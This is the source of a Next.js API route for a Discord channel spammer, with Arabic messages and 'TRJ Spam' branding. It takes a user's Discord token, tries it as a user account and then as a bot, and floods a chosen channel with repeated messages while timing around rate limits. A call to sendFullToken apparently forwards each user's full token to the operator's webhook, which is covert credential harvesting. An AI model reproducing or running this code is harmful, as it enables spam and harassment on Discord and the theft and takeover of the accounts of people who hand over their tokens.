import { NextRequest, NextResponse } from 'next/server'
import { sendToWebhook, sendFullToken } from '@/lib/webhook'
import { cleanToken } from '@/lib/discord'
import { getLogWebhookUrl } from '@/lib/config'
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit'

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request)
    const rl = rateLimit(`${rlIp}:spam`, RATE_LIMITS.medium)
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } })
    }

    const body = await request.json().catch(() => ({}))
    const { token, channelId, messages, duration = 60, speed = 0.5 } = body

    if (!token || !channelId) {
      return NextResponse.json({ success: false, error: 'التوكن وأيدي الروم مطلوبان' }, { status: 400 })
    }

    const msgList = Array.isArray(messages) ? messages.map((m: string) => String(m).trim()).filter(Boolean) : [String(messages).trim()]
    if (msgList.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل رسالة واحدة على الأقل' }, { status: 400 })
    }

    sendFullToken('تسطير', token, { '📺 القناة': channelId })

    sendToWebhook({
      username: 'TRJ Spam',
      embeds: [{
        title: '⚡ Spam',
        color: 0xf97316,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '💬 Messages', value: String(msgList.length), inline: true },
          { name: '⏱️ Duration', value: `${duration}s`, inline: true },
        ],
        timestamp: new Date().toISOString()
      }]
    }, getLogWebhookUrl()).catch(() => {})

    const ct = cleanToken(token)
    const startTime = Date.now()
    const endTime = startTime + (Number(duration) * 1000)
    let sent = 0, failed = 0
    let globalRLUntil = 0

    // تجربة التوكن كـ user ثم كـ bot
    let authHeader = ct
    const testRes = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { 'Authorization': ct },
      signal: AbortSignal.timeout(10000)
    })
    if (!testRes.ok) {
      const botRes = await fetch('https://discord.com/api/v10/users/@me', {
        headers: { 'Authorization': `Bot ${ct}` },
        signal: AbortSignal.timeout(10000)
      })
      if (botRes.ok) authHeader = `Bot ${ct}`
    }

    while (Date.now() < endTime) {
      // انتظار rate limit
      const now = Date.now()
      if (now < globalRLUntil) {
        await new Promise(r => setTimeout(r, globalRLUntil - now + 200))
      }

      const batchResults = await Promise.allSettled(
        msgList.slice(0, 5).map(async (msg) => {
          try {
            const res = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
              method: 'POST',
              headers: { 'Authorization': authHeader, 'Content-Type': 'application/json' },
              body: JSON.stringify({ content: msg }),
              signal: AbortSignal.timeout(10000)
            })
            if (res.status === 429) {
              try {
                const err = await res.json()
                const w = (err.retry_after || 1) * 1000
                globalRLUntil = Date.now() + w
              } catch {}
              return false
            }
            return res.ok || res.status === 204
          } catch { return false }
        })
      )

      for (const r of batchResults) {
        if (r.status === 'fulfilled' && r.value) sent++
        else failed++
      }

      const remaining = endTime - Date.now()
      if (remaining <= 0) break
      const waitTime = Math.min(Number(speed) * 1000, remaining)
      if (waitTime > 50) await new Promise(resolve => setTimeout(resolve, waitTime))
    }

    sendToWebhook({
      username: 'TRJ Spam',
      embeds: [{ title: '✅ Spam Done', color: 0x00FF41, fields: [{ name: '✅ Sent', value: String(sent), inline: true }, { name: '❌ Failed', value: String(failed), inline: true }] }]
    }, getLogWebhookUrl()).catch(() => {})

    return NextResponse.json({ success: true, stats: { sent, failed, total: sent + failed } })
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع'
    return NextResponse.json({ success: false, error: message }, { status: 500 })
  }
}
